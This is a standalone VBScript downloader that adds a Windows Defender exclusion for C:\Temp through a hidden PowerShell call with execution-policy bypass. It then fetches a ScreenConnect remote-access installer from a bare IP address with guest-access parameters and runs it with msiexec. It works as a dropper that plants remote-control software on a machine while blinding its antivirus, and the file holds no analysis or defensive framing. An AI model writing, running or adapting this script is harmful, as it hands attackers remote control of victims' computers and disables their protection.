Option Explicit

Dim downloadUrl
Dim savePath
Dim installDir
Dim http
Dim stream
Dim fso
Dim shell
Dim powershellCmd

downloadUrl = "http://80.76.49.124:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
installDir = "C:\Temp"
savePath = installDir & "\installer.msi"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Create the directory
If Not fso.FolderExists(installDir) Then
    fso.CreateFolder installDir
End If

' ============================================
' ADD ANTIVIRUS EXCLUSION FOR THE FOLDER
' ============================================
' Requires Administrator privileges
powershellCmd = "powershell.exe -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '" & installDir & "'"""
shell.Run powershellCmd, 0, True

' ============================================
' Download the installer
' ============================================
Set http = CreateObject("MSXML2.ServerXMLHTTP")

On Error Resume Next
http.Open "GET", downloadUrl, False
http.Send

If Err.Number <> 0 Then
    WScript.Echo "Connection error: " & Err.Description
    WScript.Quit 1
End If
On Error GoTo 0

If http.Status <> 200 Then
    WScript.Echo "HTTP Error: " & http.Status
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile savePath, 2
stream.Close

' ============================================
' Run the installer
' ============================================
If fso.FileExists(savePath) Then
    shell.Run "msiexec /i """ & savePath & """", 1, False
Else
    WScript.Echo "Installer file was not saved."
End If

' Cleanup
Set stream = Nothing
Set http = Nothing
Set shell = Nothing
Set fso = Nothing
